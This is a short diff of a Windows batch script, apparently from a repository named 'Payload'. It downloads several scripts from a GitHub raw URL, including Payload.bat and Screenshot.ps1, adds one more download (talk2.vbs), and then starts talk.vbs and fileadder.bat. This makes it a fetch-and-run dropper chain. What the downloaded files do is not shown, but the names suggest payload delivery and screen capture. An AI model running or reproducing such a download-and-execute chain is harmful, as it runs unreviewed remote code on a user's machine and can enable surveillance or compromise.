@@ -4,6 +4,7 @@ curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.b
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.ps1
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/start.bat
+curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2.vbs
 start talk.vbs
 start fileadder.bat
 timeout 3 > nul
